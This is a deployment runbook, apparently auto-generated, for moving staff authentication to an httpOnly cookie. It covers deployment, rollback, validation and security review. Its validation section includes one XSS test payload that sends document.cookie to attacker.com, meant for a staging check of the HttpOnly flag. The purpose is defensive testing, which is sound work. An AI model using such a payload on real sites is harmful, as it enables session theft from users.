# Operational Runbook: SCRUM-46 — Staff Token Security Migration

## Summary

This change migrates staff authentication from a client-side JavaScript-accessible token (sent via `X-Staff-Token` header) to a server-side cookie-based approach. The new `requireStaffAuth` middleware in `artifacts/api-server/src/middlewares/staffAuth.ts` validates staff credentials from the `pinnacle_staff_token` cookie against a registry of environment-variable-stored tokens. This remediation addresses OWASP A07 (Identification and Authentication Failures) by reducing XSS-based credential exfiltration risk.

## What changed

- **Added** `artifacts/api-server/src/middlewares/staffAuth.ts` with `requireStaffAuth` middleware function
- **Added** `buildTokenRegistry()` helper that maps `STAFF_SECRET` and `STAFF_SECRET_CHRIS` environment variables to staff identities
- **Changed** authentication method from `X-Staff-Token` header to `pinnacle_staff_token` cookie read via `req.cookies`
- **Added** `req.staffUser` object containing `{ id, role, name }` for authenticated staff members
- **Added** logging import from `../lib/logger` (imported but not yet utilized in middleware)
- **Removed** dependency on client-side `getStaffToken()` function and `X-Staff-Token` header (implied by context, frontend changes not shown in diff)

## Deployment steps

1. **Set environment variables** on all API server instances before deployment:
   ```bash
   STAFF_SECRET=<primary-admin-token-value>
   STAFF_SECRET_CHRIS=<chris-coleman-token-value>
   ```
   Generate cryptographically secure random strings (minimum 32 characters) for each token value.

2. **Verify cookie-parser middleware** is installed and configured in the Express application before `requireStaffAuth` is applied to routes:
   ```typescript
   import cookieParser from 'cookie-parser';
   app.use(cookieParser());
   ```

3. **Deploy API server** with branch `task/52` merged to main.

4. **Configure cookie-setting endpoint** (not included in this commit) to issue `pinnacle_staff_token` with the following attributes:
   - `httpOnly: true`
   - `secure: true` (requires HTTPS)
   - `sameSite: 'strict'` or `'lax'`
   - Example response:
     ```typescript
     res.cookie('pinnacle_staff_token', validatedToken, {
       httpOnly: true,
       secure: process.env.NODE_ENV === 'production',
       sameSite: 'strict',
       maxAge: 24 * 60 * 60 * 1000 // 24 hours
     });
     ```

5. **Apply `requireStaffAuth` middleware** to all staff-protected routes, including `/admin/profiles/:userId/action-items` and other admin endpoints referenced in SCRUM-46.

6. **Standard deployment** — No database migrations or additional service restarts required beyond normal API server deployment.

## Rollback procedure

1. **Revert API server** to commit prior to `af2aa68b278d498a3b40b1d3dd69b49578cabe2c`

2. **Restore previous authentication flow** by redeploying the parent commit from branch `task/52` or reverting PR #7:
   ```bash
   git revert af2aa68b278d498a3b40b1d3dd69b49578cabe2c
   # or
   git checkout <previous-commit-sha>
   ```

3. **Re-enable client-side token handling** in `artifacts/pinnacle/src/pages/internal/TasksTab.tsx` (lines 28-37) and restore `X-Staff-Token` header validation in API routes.

4. **Remove environment variables** `STAFF_SECRET` and `STAFF_SECRET_CHRIS` if rolling back permanently (optional).

5. **No data migration rollback required** — this change does not modify database schema or persistent data.

## Validation

Perform the following checks in production after deployment:

1. **Verify cookie-based authentication works:**
   - Authenticate as a staff member through the login flow
   - Inspect browser DevTools → Application → Cookies
   - Confirm `pinnacle_staff_token` cookie exists with `HttpOnly`, `Secure`, and `SameSite` flags set
   - Confirm the cookie value is **not accessible** via `document.cookie` in browser console

2. **Test protected endpoint access:**
   - Call `GET /admin/profiles/{userId}/action-items` with valid `pinnacle_staff_token` cookie
   - Expected response: HTTP 200 with action items data
   - Verify request logs show `req.staffUser.id` populated (e.g., `"primary"` or `"chris"`)

3. **Test invalid token rejection:**
   - Call the same endpoint with no cookie: expect HTTP 403 with `{"error": "Invalid staff token"}`
   - Call with an incorrect cookie value: expect HTTP 403 with `{"error": "Invalid staff token"}`

4. **Test missing environment configuration:**
   - Temporarily unset all `STAFF_SECRET_*` environment variables
   - Call protected endpoint: expect HTTP 503 with `{"error": "Staff authentication is not configured"}`
   - Restore environment variables immediately after test

5. **Verify staffUser identity propagation:**
   - Check application logs for requests authenticated as Chris Coleman
   - Confirm `req.staffUser.name` equals `"Chris Coleman"` and `req.staffUser.id` equals `"chris"`

6. **XSS exfiltration test (manual):**
   - Inject a test XSS payload (in a controlled staging environment): `<script>fetch('https://attacker.com?cookie='+document.cookie)</script>`
   - Confirm `pinnacle_staff_token` is **not present** in exfiltrated cookie string due to HttpOnly flag

## Test cases

No test cases were generated for this change.

## Security notes

Security scan not run for this change.

**Manual security review findings:**

- **INCOMPLETE AC #1:** HttpOnly, Secure, and SameSite cookie flags are not set in `requireStaffAuth` middleware. The code reads `req.cookies.pinnacle_staff_token` but does not configure these flags. Cookie-setting code must be verified separately to confirm AC compliance.

- **INCOMPLETE AC #1 (token rotation):** The token registry uses long-lived environment variable secrets with no expiration, rotation mechanism, or refresh logic. Short-lived tokens with rotation are specified as a minimum alternative but not implemented.

- **PERFORMANCE RISK:** `buildTokenRegistry()` is invoked on every request (line 35), repeatedly reading `process.env`. Move to module-scoped constant:
  ```typescript
  const TOKEN_REGISTRY = buildTokenRegistry();
  // Then reference TOKEN_REGISTRY in requireStaffAuth
  ```

- **PERMISSIONS SCOPING:** Line 50 hardcodes `role: 'admin'` for all matched tokens. No differentiation between staff permission levels is implemented. Consider whether future scoping requirements warrant a `role` field in the registry.

## References

- Work item: SCRUM-46
- Branch: task/52
- Pull request: https://github.com/pinnaclecube/pinnaclecube/pull/7
- Commit: af2aa68b278d498a3b40b1d3dd69b49578cabe2c
- Generated by: Narratia (Blue Mantis)